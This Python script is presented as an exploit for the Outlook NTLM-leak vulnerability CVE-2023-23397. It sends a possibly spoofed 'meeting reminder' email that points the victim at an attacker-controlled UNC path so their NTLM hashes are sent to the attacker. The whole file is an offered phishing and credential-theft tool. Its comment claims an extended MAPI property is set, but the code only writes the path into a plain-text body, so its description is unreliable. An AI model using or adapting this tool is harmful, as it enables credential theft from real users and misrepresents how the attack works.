"""
CVE: 2023-23397
Tested on: Windows systems with Microsoft Outlook (2016, 2019, 2021, Office 365)
Description: Exploits Microsoft Outlook vulnerability allowing NTLM hash theft via crafted calendar/reminder messages.
"""

import sys
import argparse
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib

def parse_args():
    parser = argparse.ArgumentParser(description="CVE-2023-23397 NTLM Leak via Outlook Reminder Exploit")
    parser.add_argument("-t", "--to", required=True, help="Target victim email")
    parser.add_argument("-f", "--from-addr", required=True, help="Sender email (can be spoofed)")
    parser.add_argument("-s", "--smtp", required=True, help="SMTP server address (e.g., smtp.target.com:25)")
    parser.add_argument("-u", "--unc", required=True, help="UNC path to your attacker-controlled server (e.g., \\\\attacker-ip\\share)")
    return parser.parse_args()

def create_malicious_email(sender, recipient, unc_path):
    msg = MIMEMultipart()
    msg['From'] = sender
    msg['To'] = recipient
    msg['Subject'] = "Important: Meeting Reminder"

    # Extended MAPI property using the malicious UNC path
    body = f"""
This is a reminder for your upcoming meeting.

To join the call, please click the shared drive below:
{unc_path}

Outlook will try to fetch this path, triggering NTLM authentication.
"""
    msg.attach(MIMEText(body, 'plain'))
    return msg

def send_email(smtp_server, sender, recipient, msg):
    server, port = smtp_server.split(":")
    port = int(port)
    try:
        with smtplib.SMTP(server, port, timeout=10) as smtp:
            smtp.sendmail(sender, recipient, msg.as_string())
            print("[+] Malicious email sent successfully.")
    except Exception as e:
        print(f"[-] Failed to send email: {e}")

if __name__ == "__main__":
    args = parse_args()
    print("[*] Crafting malicious email...")
    malicious_msg = create_malicious_email(args.from_addr, args.to, args.unc)
    print("[*] Sending email via SMTP...")
    send_email(args.smtp, args.from_addr, args.to, malicious_msg)
